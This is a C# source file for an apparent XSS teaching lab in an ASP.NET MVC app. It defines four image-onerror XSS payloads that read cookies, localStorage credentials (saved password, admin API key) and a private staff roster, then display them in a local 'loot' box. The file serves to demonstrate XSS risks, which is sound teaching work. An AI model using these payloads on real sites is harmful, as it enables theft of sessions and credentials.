using MvcAuthApp.Models;

namespace MvcAuthApp.Auth;

public static class XssLabAttacks
{
    public static readonly XssLabAttack[] All =
    {
        new XssLabAttack
        {
            Kind = "cookies",
            Title = "Steal cookies",
            Hint = "Reads every cookie JavaScript can see. That includes a saved login you forgot to mark HttpOnly.",
            Html = "<img src=\"/missing-xss-lab-cookies\" alt=\"\" onerror=\"(function(){var b=document.getElementById('loot');if(!b)return;b.textContent='Stolen cookies:\\n'+document.cookie;})()\">"
        },
        new XssLabAttack
        {
            Kind = "storage",
            Title = "Steal saved password + API key",
            Hint = "localStorage is always visible to script. A remembered email/password and an admin API key live there.",
            Html = "<img src=\"/missing-xss-lab-storage\" alt=\"\" onerror=\"(function(){var b=document.getElementById('loot');if(!b)return;b.textContent='Stolen localStorage:\\nsavedEmail='+(localStorage.getItem('savedEmail')||'')+'\\nsavedPassword='+(localStorage.getItem('savedPassword')||'')+'\\nadminApiKey='+(localStorage.getItem('adminApiKey')||'');})()\">"
        },
        new XssLabAttack
        {
            Kind = "roster",
            Title = "Scrape other users from the page",
            Hint = "The staff roster is in the HTML. Script can copy the table, including demo passwords.",
            Html = "<img src=\"/missing-xss-lab-roster\" alt=\"\" onerror=\"(function(){var b=document.getElementById('loot');var t=document.getElementById('private-roster');if(!b||!t)return;b.textContent='Stolen roster:\\n'+t.innerText;})()\">"
        },
        new XssLabAttack
        {
            Kind = "all",
            Title = "Take everything",
            Hint = "Cookies, localStorage, and the roster in one comment. Same as mailing it to an attacker box.",
            Html = "<img src=\"/missing-xss-lab-all\" alt=\"\" onerror=\"(function(){var b=document.getElementById('loot');var t=document.getElementById('private-roster');if(!b)return;var lines=[];lines.push('cookies: '+document.cookie);lines.push('savedEmail: '+(localStorage.getItem('savedEmail')||''));lines.push('savedPassword: '+(localStorage.getItem('savedPassword')||''));lines.push('adminApiKey: '+(localStorage.getItem('adminApiKey')||''));if(t){lines.push('roster:');lines.push(t.innerText);}b.textContent=lines.join('\\n');})()\">"
        }
    };

    public static XssLabAttack? Find(string? kind)
    {
        if (string.IsNullOrWhiteSpace(kind))
        {
            return null;
        }

        foreach (XssLabAttack attack in All)
        {
            if (attack.Kind == kind)
            {
                return attack;
            }
        }

        return null;
    }
}
